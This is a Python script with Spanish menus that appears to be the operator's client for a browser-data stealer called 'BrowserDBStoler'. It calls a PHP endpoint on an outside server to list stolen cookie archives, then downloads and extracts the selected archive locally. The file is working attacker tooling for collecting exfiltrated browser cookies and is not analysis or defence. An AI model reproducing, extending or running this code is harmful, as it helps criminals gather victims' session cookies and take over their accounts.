import os, time
import requests # pip install requests
from zipfile import ZipFile

REMOTE_WORKSPACE = "https://dev.crizacio.com/BrowserDBStoler/"
COOKIES_API = REMOTE_WORKSPACE+"cookies.php"
LOCAL_WORKSPACE = os.path.dirname(os.path.realpath(__file__))+"\\"
print(f"Trabajando en '{LOCAL_WORKSPACE}'.")
os.system("pause")

repetir = True
remoteZIP_Selected = None
encryption_key = None
def ListarArchivosDelServidor():
    global remoteZIP_Selected
    os.system("cls")
    remoteCookies = requests.get(str(f"{COOKIES_API}?get=files")).json()['description']
    i = 1
    for item in remoteCookies:
        print("    {}) {}".format(i, item))
        i += 1
    tarjet = int(input("Archivo a seleccionar (0 para omitir): "))
    if tarjet != 0:
        remoteZIP_Selected = remoteCookies[tarjet-1]
        print("Seleccionado: {}".format(remoteZIP_Selected))
        os.system("pause")

def DescargarArchivoSeleccionado():
    global remoteZIP_Selected
    os.system("cls")
    if remoteZIP_Selected == None:
        print("Debe seleccionar un archivo remoto!")
        ListarArchivosDelServidor()
    else:
        print("Descargando...")
        open(LOCAL_WORKSPACE+remoteZIP_Selected, 'wb').write(requests.get(str(f"{REMOTE_WORKSPACE}cookies/{remoteZIP_Selected}")).content)
        print("Archivo descargado correctamente!")
        time.sleep(2)
        DescomprimirArchivoDescargado(LOCAL_WORKSPACE+remoteZIP_Selected)
        os.system("pause")

def DescomprimirArchivoDescargado(filePath: str = None):
    os.system("cls")
    if filePath == None:
        filePath = LOCAL_WORKSPACE+remoteZIP_Selected
    print("Descomprimiendo...")
    time.sleep(2)
    with ZipFile(filePath, 'r') as zip_ref:
        unzipDir = str("{}".format(filePath.replace(".zip", "")))
        os.mkdir(unzipDir)
        zip_ref.extractall(unzipDir)
    time.sleep(1)
    print("Descompresion exitosa!")
    time.sleep(2)

def menuPrincipal():
    global repetir
    try:
        print("Ingrese el número de la opción a la que desea ingresar")
        print("    1. Listar archivos del servidor.")
        print("    2. Descargar archivo seleccionado.".format())
        print("    3. Descomprimir archivo seleccionado.")
        print("    0. Salir")
        print("")
        opcion = None
        try:
            opcion = int(input("Opción: "))
        except:
            print("Se espera un valor númerico para la opción.")
            time.sleep(1)
            return
        if (opcion == 1):
            ListarArchivosDelServidor()
        elif (opcion == 2):
            DescargarArchivoSeleccionado()
        elif (opcion == 3):
            DescomprimirArchivoDescargado()
        elif (opcion == 0):
            repetir = False
        else:
            print("Opción no existente.")
            time.sleep(1)
            return
    except Exception as e:
        print("Ups! Un error. {}".format(e))
        time.sleep(2)
        os.system("pause")
        return

def main():
    global repetir
    while repetir:
        os.system("cls")
        menuPrincipal()
main()
